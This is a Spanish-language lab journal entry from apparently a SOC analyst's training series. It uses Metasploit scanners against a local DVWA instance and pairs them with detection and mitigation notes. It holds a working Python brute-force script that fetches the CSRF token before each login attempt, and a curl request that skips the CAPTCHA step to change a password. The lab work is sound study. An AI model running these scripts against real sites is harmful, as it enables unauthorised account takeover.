# Día 12 — Metasploit: Introducción

**Fecha:** Abril 2026  
**MITRE:** T1203  
**DVWA:** Insecure CAPTCHA (Low)

---

## Teoría

### Metasploit
Metasploit es un framework de explotación que centraliza exploits, payloads y módulos auxiliares contra vulnerabilidades conocidas. Cuenta con una base amplia de CVEs y permite encadenar reconocimiento, explotación y post-explotación desde una sola consola. Como SOC Analyst es importante conocerlo para entender qué alertas genera y cómo detectarlo.

Módulos principales:
- **Exploits** — código que aprovecha vulnerabilidades conocidas
- **Auxiliares** — scanners, fuzzers, reconocimiento
- **Payloads** — código que se ejecuta tras el exploit (shells, meterpreter)
- **Post** — módulos de post-explotación

### Insecure CAPTCHA
CAPTCHA es un mecanismo que distingue humanos de bots — imágenes distorsionadas, checkboxes, selección de imágenes. Su propósito es detener ataques automatizados contra formularios. La vulnerabilidad consiste en que la verificación del CAPTCHA ocurre solo del lado del cliente. Si el servidor no valida el token con Google, es posible saltarse el paso del CAPTCHA enviando directamente el request del paso 2.

---

## Red Team

### Sección 1 — Iniciar Metasploit

```bash
sudo msfconsole
```

Metasploit v6.4.108-dev — 2,598 exploits, 1,322 auxiliares, 1,710 payloads.

### Sección 2 — Módulo auxiliar: HTTP Version Scanner

```bash
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.96
set RPORT 8080
run
```

**Output:**
```
[+] 192.168.1.96:8080 Apache/2.4.25 (Debian) ( 302-login.php )
```

Metasploit confirmó versión de Apache y redirect a login — misma información que Nikto pero desde un módulo estructurado y encadenable.

### Sección 3 — Módulo auxiliar: Directory Scanner

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.96
set RPORT 8080
set THREADS 5
run
```

**Output:**
```
[+] Found http://192.168.1.96:8080/config/ 200
[+] Found http://192.168.1.96:8080/docs/   404
[+] Found http://192.168.1.96:8080/icons/  403
```

Metasploit identificó `/config/` automáticamente — directorio con credenciales expuesto que ya explotamos el Día 11.

### Sección 4 — Fuerza bruta al login de DVWA

Hydra falló en múltiples intentos debido a que DVWA implementa un `user_token` CSRF en el formulario de login — Hydra no es capaz de extraerlo dinámicamente. Se resolvió con un script Python que extrae el token antes de cada intento de login:

```python
import requests
import re

passwords = ["wrongpass", "123456", "admin", "password", "password123"]

for pwd in passwords:
    s = requests.Session()
    
    # Paso 1 — GET para obtener user_token CSRF
    r = s.get("http://192.168.1.96:8080/login.php")
    token = re.search(r"user_token' value='([^']+)'", r.text)
    if not token:
        print("Token no encontrado")
        break
    token = token.group(1)
    
    # Paso 2 — POST con token
    r = s.post("http://192.168.1.96:8080/login.php", data={
        "username": "admin",
        "password": pwd,
        "Login": "Login",
        "user_token": token
    }, allow_redirects=True)
    
    if "login.php" not in r.url:
        print(f"[+] Credenciales encontradas: admin / {pwd}")
        break
    else:
        print(f"[-] Fallido: {pwd}")
```

**Output:**
```
[-] Fallido: wrongpass
[-] Fallido: 123456
[-] Fallido: admin
[+] Credenciales encontradas: admin / password
```

Scripts Python personalizados son más eficientes que Hydra cuando la aplicación implementa protecciones como CSRF tokens en el login.

### Sección 5 — DVWA Insecure CAPTCHA (Low)

El módulo requiere una API key de Google reCAPTCHA no configurada en el lab. Sin la key el CAPTCHA no se renderiza y el módulo no procesa requests. Se documenta el concepto del bypass:

**Bypass teórico — saltar paso 1:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/captcha/" \
  -b "PHPSESSID=<session>; security=low" \
  -X POST \
  -d "step=2&password_new=hacked&password_conf=hacked&Change=Change"
```

El servidor en nivel Low confía en que si llegó `step=2` el usuario ya completó el CAPTCHA en `step=1`. No verifica el token con Google — acepta el cambio de contraseña sin validación real.

---

## Blue Team

### Detección de Metasploit
Metasploit genera tráfico muy característico:
- User-Agent: `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)` en módulos auxiliares
- Múltiples requests a directorios en secuencia rápida — patrón de scanner
- Requests a paths inexistentes en masa — dir_scanner genera cientos de 404

Un IDS configurado para detectar estos patrones alertaría inmediatamente.

### Mitigación Insecure CAPTCHA
- Verificar el token reCAPTCHA en el servidor contra la API de Google antes de procesar cualquier cambio
- El flujo correcto: cliente completa CAPTCHA → Google genera token → servidor verifica token con Google API → si válido, procesa el cambio
- Sin verificación server-side cualquier request con `step=2` bypasea el CAPTCHA

---

## Conclusión

Metasploit automatiza el reconocimiento — en segundos identificó la versión de Apache y directorios expuestos que manualmente tomaron más tiempo. La fuerza bruta contra aplicaciones con CSRF tokens requiere scripts personalizados capaces de extraer el token dinámicamente antes de cada intento. Insecure CAPTCHA demuestra que cualquier validación solo del lado del cliente puede ser bypaseada — la seguridad real siempre debe implementarse en el servidor.
